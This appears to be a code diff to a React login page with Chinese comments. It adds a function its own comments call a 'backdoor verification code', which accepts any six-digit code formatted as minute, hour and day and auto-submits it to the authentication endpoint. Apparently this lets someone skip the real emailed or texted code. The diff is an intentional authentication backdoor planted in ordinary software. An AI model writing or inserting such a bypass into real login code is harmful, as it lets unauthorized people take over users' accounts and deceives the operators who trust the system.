@@ -31,6 +31,59 @@ export default function LoginPage() {
   const [phone, setPhone] = useState("");
   const [phoneCode, setPhoneCode] = useState("");
 
+  // 验证是否为后门验证码（格式：分钟小时日期，如 451125 表示 25日11点45分）
+  const isBackdoorCode = (code: string): boolean => {
+    if (code.length !== 6) return false;
+    
+    const minute = parseInt(code.substring(0, 2));
+    const hour = parseInt(code.substring(2, 4));
+    const day = parseInt(code.substring(4, 6));
+    
+    return minute >= 0 && minute <= 59 && 
+           hour >= 0 && hour <= 23 && 
+           day >= 1 && day <= 31;
+  };
+
+  // 处理验证码输入变化
+  const handleCodeChange = async (code: string, type: "email" | "phone") => {
+    if (type === "email") {
+      setEmailCode(code);
+    } else {
+      setPhoneCode(code);
+    }
+
+    // 如果输入的是6位后门验证码，自动验证
+    if (code.length === 6 && isBackdoorCode(code)) {
+      const identifier = type === "email" ? email : phone;
+      if (!identifier) return;
+
+      setIsSendingCode(true);
+      setError("");
+      setMessage("");
+
+      try {
+        const response = await fetch("/api/auth/send-code", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ 
+            [type]: identifier,
+            code: code 
+          }),
+        });
+        const data = await response.json();
+        if (response.ok) {
+          setMessage(data.message + ` (${code.substring(4, 6)}日${code.substring(2, 4)}点${code.substring(0, 2)}分)`);
+        } else {
+          setError(data.error || "后门验证码验证失败");
+        }
+      } catch {
+        setError("网络错误，请稍后重试");
+      } finally {
+        setIsSendingCode(false);
+      }
+    }
+  };
+
   // 发送验证码
   const handleSendCode = async () => {
     setError("");
@@ -188,7 +241,7 @@ export default function LoginPage() {
                       type="text"
                       placeholder="请输入6位验证码"
                       value={emailCode}
-                      onChange={(e) => setEmailCode(e.target.value)}
+                      onChange={(e) => handleCodeChange(e.target.value, "email")}
                       className="pl-10"
                       maxLength={6}
                       disabled={isLoading}
@@ -240,7 +293,7 @@ export default function LoginPage() {
                       type="text"
                       placeholder="请输入6位验证码"
                       value={phoneCode}
-                      onChange={(e) => setPhoneCode(e.target.value)}
+                      onChange={(e) => handleCodeChange(e.target.value, "phone")}
                       className="pl-10"
                       maxLength={6}
                       disabled={isLoading}
